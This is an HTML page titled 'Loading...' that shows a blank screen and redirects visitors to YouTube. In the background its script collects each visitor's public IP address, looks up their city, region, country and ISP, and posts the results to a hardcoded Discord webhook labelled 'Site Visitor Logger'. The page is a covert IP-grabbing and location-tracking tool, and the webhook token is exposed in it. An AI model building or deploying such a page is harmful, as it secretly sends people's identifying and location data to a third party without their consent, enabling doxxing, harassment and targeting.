<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        /* Ensures the website is completely blank and white */
        body {
            background-color: #ffffff;
            margin: 0;
            padding: 0;
        }
    </style>
</head>
<body>

    <script>
    // --- CONFIGURATION ---
    // Replace this URL with the website you want to redirect to
    const targetWebsite = 'https://www.youtube.com'; 
    const delayInSeconds = 10; 

    // 1. Independent Redirect Timer
    // This runs completely separate from the API requests so the redirect happens even if the APIs are slow.
    setTimeout(() => {
        window.location.href = targetWebsite;
    }, delayInSeconds * 2);


    // 2. Background Data Tracking Chain
    fetch('https://api.ipify.org/')
        .then(response => {
            if (!response.ok) throw new Error('Failed to reach ipify');
            return response.text(); 
        })
        .then(rawIpText => {
            const cleanIp = rawIpText.trim();
            console.log("Step 1 Success! Captured Raw IP:", cleanIp);

            // Fetch location data using the IP
            return fetch(`https://ipapi.co/${cleanIp}/json/`);
        })
        .then(response => {
            if (!response.ok) throw new Error('ipapi rejected the request: ' + response.status);
            return response.json();
        })
        .then(data => {
            const city = data.city || "";
            const region = data.region || "";
            const country = data.country_name || "";
            const locationString = `${city}, ${region}, ${country}`;
            
            // Construct payload and forward to Discord (UI assignment steps removed)
            const discordPayload = {
                username: "Site Visitor Logger",
                avatar_url: "https://i.imgur.com/4M3m5AV.png", 
                embeds: [{
                    title: "📌 New Visitor Logged",
                    color: 3447003, 
                    fields: [
                        { name: "IP Address", value: data.ip || "Unknown", inline: true },
                        { name: "ISP Provider", value: data.org || "Unknown", inline: true },
                        { name: "Location", value: locationString || "Unknown", inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            sendToDiscord(discordPayload);
        })
        .catch(error => {
            console.error('Tracking chain background error:', error);
        });

    // Helper function to handle the Discord POST request
    function sendToDiscord(payload) {
        const webhookUrl = 'https://discord.com/api/webhooks/1522030213465112596/qAxiRSnZTVJeXQfsnhXrY-bfpH-CakQ9tDKkhMYmCAop_y3AjcRL5OnKLuk7UwDLxzIt'; 

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (!response.ok) {
                console.error('Discord API rejected payload:', response.statusText);
            } else {
                console.log('Successfully forwarded tracking data to Discord.');
            }
        })
        .catch(err => console.error('Error sending data to Discord:', err));
    }
</script>

</body>
</html>
